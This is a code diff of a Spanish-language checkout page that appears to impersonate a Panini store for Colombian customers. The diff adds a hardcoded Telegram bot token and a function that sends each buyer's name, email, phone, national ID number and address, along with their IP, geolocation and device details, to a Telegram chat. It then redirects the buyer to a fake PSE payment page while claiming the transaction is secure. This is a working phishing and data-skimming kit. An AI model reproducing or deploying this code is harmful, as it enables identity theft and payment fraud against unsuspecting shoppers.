@@ -30,7 +30,6 @@
             gap: 30px;
         }
 
-        /* Formulario */
         .checkout-form {
             background: #FFFFFF;
             border-radius: 24px;
@@ -101,7 +100,6 @@
             font-size: 13px;
         }
 
-        /* Resumen del pedido */
         .order-summary {
             background: #FFFFFF;
             border-radius: 24px;
@@ -200,10 +198,9 @@
 <body>
 
 <div class="container">
-    <!-- COLUMNA IZQUIERDA - FORMULARIO DE ENVÍO -->
     <div class="checkout-form">
         <!-- Contacto -->
-        <h2 class="section-title">Contacto</h2>
+        <h2 class="section-title">📞 Contacto</h2>
         <div class="form-group">
             <label>Correo electrónico</label>
             <input type="email" id="email" placeholder="tucorreo@ejemplo.com">
@@ -214,55 +211,59 @@
         </div>
 
         <!-- Identificación -->
-        <h2 class="section-title">Identificación</h2>
+        <h2 class="section-title">🆔 Identificación</h2>
         <div class="form-group">
             <label>Tipo de identificación</label>
             <select id="tipo-identificacion">
-                <option value="Cedula">Cédula de ciudadanía</option>
-                <option value="Nit">NIT</option>
+                <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
+                <option value="NIT">NIT</option>
                 <option value="Pasaporte">Pasaporte</option>
             </select>
         </div>
+        <div class="form-group">
+            <label>Número de identificación</label>
+            <input type="text" id="num-identificacion" placeholder="Número de identificación">
+        </div>
 
         <!-- Entrega -->
-        <h2 class="section-title">Entrega</h2>
+        <h2 class="section-title">🚚 Entrega</h2>
         <div class="row-2">
             <div class="form-group">
                 <label>Departamento</label>
                 <select id="departamento">
                     <option value="">Seleccione un departamento</option>
-                    <option value="AMAZONAS">Amazonas</option>
-                    <option value="ANTIOQUIA">Antioquia</option>
-                    <option value="ARAUCA">Arauca</option>
-                    <option value="ATLANTICO">Atlántico</option>
-                    <option value="BOLIVAR">Bolívar</option>
-                    <option value="BOYACA">Boyacá</option>
-                    <option value="CALDAS">Caldas</option>
-                    <option value="CAQUETA">Caquetá</option>
-                    <option value="CASANARE">Casanare</option>
-                    <option value="CAUCA">Cauca</option>
-                    <option value="CESAR">Cesar</option>
-                    <option value="CHOCO">Chocó</option>
-                    <option value="CORDOBA">Córdoba</option>
-                    <option value="CUNDINAMARCA">Cundinamarca</option>
-                    <option value="GUAINIA">Guainía</option>
-                    <option value="GUAVIARE">Guaviare</option>
-                    <option value="HUILA">Huila</option>
-                    <option value="LA GUAJIRA">La Guajira</option>
-                    <option value="MAGDALENA">Magdalena</option>
-                    <option value="META">Meta</option>
-                    <option value="NARIÑO">Nariño</option>
-                    <option value="NORTE DE SANTANDER">Norte de Santander</option>
-                    <option value="PUTUMAYO">Putumayo</option>
-                    <option value="QUINDIO">Quindío</option>
-                    <option value="RISARALDA">Risaralda</option>
-                    <option value="SAN ANDRES Y PROVIDENCIA">San Andrés y Providencia</option>
-                    <option value="SANTANDER">Santander</option>
-                    <option value="SUCRE">Sucre</option>
-                    <option value="TOLIMA">Tolima</option>
-                    <option value="VALLE DEL CAUCA">Valle del Cauca</option>
-                    <option value="VAUPES">Vaupés</option>
-                    <option value="VICHADA">Vichada</option>
+                    <option value="Amazonas">Amazonas</option>
+                    <option value="Antioquia">Antioquia</option>
+                    <option value="Arauca">Arauca</option>
+                    <option value="Atlántico">Atlántico</option>
+                    <option value="Bolívar">Bolívar</option>
+                    <option value="Boyacá">Boyacá</option>
+                    <option value="Caldas">Caldas</option>
+                    <option value="Caquetá">Caquetá</option>
+                    <option value="Casanare">Casanare</option>
+                    <option value="Cauca">Cauca</option>
+                    <option value="Cesar">Cesar</option>
+                    <option value="Chocó">Chocó</option>
+                    <option value="Córdoba">Córdoba</option>
+                    <option value="Cundinamarca">Cundinamarca</option>
+                    <option value="Guainía">Guainía</option>
+                    <option value="Guaviare">Guaviare</option>
+                    <option value="Huila">Huila</option>
+                    <option value="La Guajira">La Guajira</option>
+                    <option value="Magdalena">Magdalena</option>
+                    <option value="Meta">Meta</option>
+                    <option value="Nariño">Nariño</option>
+                    <option value="Norte de Santander">Norte de Santander</option>
+                    <option value="Putumayo">Putumayo</option>
+                    <option value="Quindío">Quindío</option>
+                    <option value="Risaralda">Risaralda</option>
+                    <option value="San Andrés y Providencia">San Andrés y Providencia</option>
+                    <option value="Santander">Santander</option>
+                    <option value="Sucre">Sucre</option>
+                    <option value="Tolima">Tolima</option>
+                    <option value="Valle del Cauca">Valle del Cauca</option>
+                    <option value="Vaupés">Vaupés</option>
+                    <option value="Vichada">Vichada</option>
                 </select>
             </div>
             <div class="form-group">
@@ -276,20 +277,16 @@
                 <label>País / Región</label>
                 <input type="text" id="pais" value="Colombia" readonly style="background:#f8fafc;">
             </div>
-            <div class="form-group">
-                <label>Nombre</label>
-                <input type="text" id="nombre" placeholder="Nombre">
-            </div>
         </div>
 
         <div class="row-2">
             <div class="form-group">
-                <label>Apellidos</label>
-                <input type="text" id="apellidos" placeholder="Apellidos">
+                <label>Nombre</label>
+                <input type="text" id="nombre" placeholder="Nombre">
             </div>
             <div class="form-group">
-                <label>Número de identificación</label>
-                <input type="text" id="num-identificacion" placeholder="Número de identificación">
+                <label>Apellidos</label>
+                <input type="text" id="apellidos" placeholder="Apellidos">
             </div>
         </div>
 
@@ -326,31 +323,30 @@
         </div>
     </div>
 
-    <!-- COLUMNA DERECHA - RESUMEN DEL CARRITO -->
     <div class="order-summary">
-        <h2 class="section-title">Tu pedido</h2>
+        <h2 class="section-title">🛒 Tu pedido</h2>
         <div id="cart-items-summary">
             <div style="text-align:center; padding:20px; color:#999;">Cargando productos...</div>
         </div>
         <div class="summary-total">
             <div class="total-row">
-                <span>Total</span>
+                <span>💰 Total</span>
                 <span id="cart-total-display">$0</span>
             </div>
         </div>
-        <button class="btn-pagar" id="checkout-pay-btn">Pagar ahora</button>
+        <button class="btn-pagar" id="checkout-pay-btn">✅ Pagar ahora</button>
         <div style="font-size: 11px; text-align: center; margin-top: 15px; color: #999;">
-            Todos las transacciones son seguras y están encargadas.
+            🔐 Todas las transacciones son seguras y están encargadas.
         </div>
     </div>
 </div>
 
 <script>
     // =============================================
-    // 🔴 CAMBIA ESTA URL POR LA QUE QUIERAS 🔴
+    // CONFIGURACIÓN DE TELEGRAM
     // =============================================
-    const REDIRECT_URL = 'https://hrg.mra.temporary.site/recargas/';
-    // Puedes cambiarla por: 'https://tusitio.com/pago', 'pago-pse.html', etc.
+    const TELEGRAM_BOT_TOKEN = '8607426657:AAFFQMG_061Qf_HlkDuMmzgXFsWH9mSmBOk';
+    const TELEGRAM_CHAT_ID = '-5114864668';
     // =============================================
 
     // Formatear pesos colombianos
@@ -401,9 +397,8 @@
         
         container.innerHTML = html;
         document.getElementById('cart-total-display').innerText = formatCOP(total);
-        
-        // Guardar total en variable global
         window.cartTotal = total;
+        window.cart = cart;
     }
 
     // Validar formulario
@@ -416,40 +411,125 @@
         const departamento = document.getElementById('departamento').value;
         const ciudad = document.getElementById('ciudad').value;
         
-        if (!email) {
-            alert('Por favor ingresa tu correo electrónico');
-            return false;
-        }
-        if (!nombre) {
-            alert('Por favor ingresa tu nombre');
-            return false;
-        }
-        if (!apellidos) {
-            alert('Por favor ingresa tus apellidos');
-            return false;
-        }
-        if (!direccion) {
-            alert('Por favor ingresa tu dirección');
-            return false;
-        }
-        if (!telefono) {
-            alert('Por favor ingresa tu teléfono');
-            return false;
-        }
-        if (!departamento) {
-            alert('Por favor selecciona un departamento');
-            return false;
-        }
-        if (!ciudad) {
-            alert('Por favor ingresa tu ciudad o municipio');
-            return false;
-        }
+        if (!email) { alert('Por favor ingresa tu correo electrónico'); return false; }
+        if (!nombre) { alert('Por favor ingresa tu nombre'); return false; }
+        if (!apellidos) { alert('Por favor ingresa tus apellidos'); return false; }
+        if (!direccion) { alert('Por favor ingresa tu dirección'); return false; }
+        if (!telefono) { alert('Por favor ingresa tu teléfono'); return false; }
+        if (!departamento) { alert('Por favor selecciona un departamento'); return false; }
+        if (!ciudad) { alert('Por favor ingresa tu ciudad o municipio'); return false; }
         
         return true;
     }
 
-    // Guardar datos de envío
-    function guardarDatosEnvio() {
+    // Enviar datos a Telegram
+    async function enviarATelegram(datosEnvio, total, productos) {
+        const ahora = new Date();
+        const fecha = ahora.toLocaleString('es-ES', { 
+            weekday: 'long', 
+            year: 'numeric', 
+            month: 'long', 
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            hour12: false
+        });
+        
+        // Obtener IP del usuario
+        let ip = 'No disponible';
+        let pais = 'No disponible';
+        let ciudadGeo = 'No disponible';
+        
+        try {
+            const resIp = await fetch('https://api.ipify.org?format=json');
+            const dataIp = await resIp.json();
+            ip = dataIp.ip;
+            
+            const resGeo = await fetch(`https://ipapi.co/${ip}/json/`);
+            const dataGeo = await resGeo.json();
+            pais = dataGeo.country_name || 'No disponible';
+            ciudadGeo = dataGeo.city || 'No disponible';
+        } catch(e) {
+            console.log('Error obteniendo geolocalización:', e);
+        }
+        
+        // Detectar dispositivo
+        const userAgent = navigator.userAgent;
+        let dispositivo = '💻 Desktop';
+        if (userAgent.includes('iPhone') || userAgent.includes('Android')) dispositivo = '📱 Móvil';
+        else if (userAgent.includes('iPad')) dispositivo = '📟 Tablet';
+        
+        // Construir mensaje
+        let mensaje = `🟢 *NUEVO PEDIDO - PANINI* 🟢\n\n`;
+        mensaje += `🌐 *IP:* ${ip}\n`;
+        mensaje += `📍 *País:* ${pais}\n`;
+        mensaje += `🏙️ *Ciudad:* ${ciudadGeo}\n`;
+        mensaje += `🔗 *Referido:* ${document.referrer || 'Directo'}\n`;
+        mensaje += `📄 *Página:* /checkout\n`;
+        mensaje += `⏰ *Fecha/Hora:* ${fecha}\n`;
+        mensaje += `📱 *Dispositivo:* ${dispositivo}\n\n`;
+        mensaje += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        mensaje += `📦 *DATOS DEL CLIENTE*\n\n`;
+        mensaje += `👤 *Nombre:* ${datosEnvio.nombre || 'No especificado'}\n`;
+        mensaje += `👥 *Apellidos:* ${datosEnvio.apellidos || 'No especificado'}\n`;
+        mensaje += `📧 *Email:* ${datosEnvio.email || 'No especificado'}\n`;
+        mensaje += `📞 *Teléfono:* ${datosEnvio.telefono || 'No especificado'}\n\n`;
+        mensaje += `🆔 *Tipo ID:* ${datosEnvio.tipoIdentificacion || 'No especificado'}\n`;
+        mensaje += `🔢 *Número ID:* ${datosEnvio.numeroIdentificacion || 'No especificado'}\n\n`;
+        mensaje += `🏠 *Dirección:* ${datosEnvio.direccion || 'No especificado'}\n`;
+        mensaje += `🏢 *Complemento:* ${datosEnvio.complemento || 'Ninguno'}\n`;
+        mensaje += `🏙️ *Ciudad:* ${datosEnvio.ciudad || 'No especificado'}\n`;
+        mensaje += `🗺️ *Departamento:* ${datosEnvio.departamento || 'No especificado'}\n`;
+        mensaje += `📍 *Provincia:* ${datosEnvio.provincia || 'No especificado'}\n`;
+        mensaje += `📮 *Código Postal:* ${datosEnvio.codigoPostal || 'No especificado'}\n\n`;
+        mensaje += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        mensaje += `🛒 *RESUMEN DEL PEDIDO*\n\n`;
+        mensaje += `💰 *Total a pagar:* ${formatCOP(total)}\n`;
+        mensaje += `📦 *Productos:* ${productos.length}\n\n`;
+        mensaje += `🛍️ *PRODUCTOS:*\n`;
+        productos.forEach((prod, idx) => {
+            mensaje += `${idx + 1}. ${prod.name}\n`;
+            mensaje += `   📦 Cantidad: ${prod.quantity}\n`;
+            mensaje += `   💰 Precio: ${formatCOP(prod.price)}\n`;
+            mensaje += `   ━━━━━━━━━━━━━━━\n`;
+        });
+        mensaje += `\n✅ *Envío:* Gratis\n`;
+        mensaje += `💳 *Método de pago:* PSE\n\n`;
+        mensaje += `🔐 *Pedido generado automáticamente*`;
+        
+        // Enviar a Telegram
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const params = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+        };
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            });
+            const result = await response.json();
+            if (result.ok) {
+                console.log('Mensaje enviado a Telegram correctamente');
+            } else {
+                console.log('Error al enviar a Telegram:', result);
+            }
+        } catch(e) {
+            console.log('Error de conexión con Telegram:', e);
+        }
+    }
+
+    // Guardar datos de envío y procesar
+    function guardarYProcesar() {
+        if (!validarFormulario()) return;
+        if (!window.cartTotal || window.cartTotal === 0 || !window.cart || window.cart.length === 0) {
+            alert('No hay productos en tu carrito');
+            return;
+        }
+        
         const datosEnvio = {
             email: document.getElementById('email').value,
             tipoIdentificacion: document.getElementById('tipo-identificacion').value,
@@ -466,31 +546,21 @@
             ofertas: document.getElementById('ofertas').checked,
             guardarInfo: document.getElementById('guardar-info').checked
         };
+        
+        // Guardar en localStorage
         localStorage.setItem('datosEnvio', JSON.stringify(datosEnvio));
+        
+        // Enviar a Telegram
+        enviarATelegram(datosEnvio, window.cartTotal, window.cart);
+        
+        // Mostrar mensaje y redirigir
+        alert('✅ Datos guardados correctamente. Redirigiendo al pago...\nTotal: ' + formatCOP(window.cartTotal));
+        
+        // Redirigir al pago PSE
+        window.location.href = '/panini/recarga.html';
     }
 
-    // Procesar pago y redirigir
-    function procesarPago() {
-        if (!validarFormulario()) return;
-        
-        if (!window.cartTotal || window.cartTotal === 0) {
-            alert('No hay productos en tu carrito');
-            return;
-        }
-        
-        // Guardar datos de envío
-        guardarDatosEnvio();
-        
-        // Mostrar mensaje de redirección
-        alert('Redirigiendo a la pasarela de pagos...\nTotal a pagar: ' + formatCOP(window.cartTotal));
-        
-        // =============================================
-        // REDIRECCIÓN - CAMBIA 'REDIRECT_URL' ARRIBA
-        // =============================================
-        window.location.href = REDIRECT_URL;
-    }
-
-    // Cargar datos guardados previamente
+    // Cargar datos guardados
     function cargarDatosGuardados() {
         const datosGuardados = localStorage.getItem('datosEnvio');
         if (datosGuardados) {
@@ -502,7 +572,7 @@
             document.getElementById('telefono').value = datos.telefono || '';
             document.getElementById('departamento').value = datos.departamento || '';
             document.getElementById('ciudad').value = datos.ciudad || '';
-            document.getElementById('tipo-identificacion').value = datos.tipoIdentificacion || 'Cedula';
+            document.getElementById('tipo-identificacion').value = datos.tipoIdentificacion || 'Cédula de ciudadanía';
             document.getElementById('num-identificacion').value = datos.numeroIdentificacion || '';
             document.getElementById('complemento').value = datos.complemento || '';
             document.getElementById('provincia').value = datos.provincia || '';
@@ -511,10 +581,8 @@
         }
     }
 
-    // Eventos
-    document.getElementById('checkout-pay-btn').addEventListener('click', procesarPago);
-    
-    // Cargar datos
+    // Inicializar
+    document.getElementById('checkout-pay-btn').addEventListener('click', guardarYProcesar);
     loadCartSummary();
     cargarDatosGuardados();
 </script>
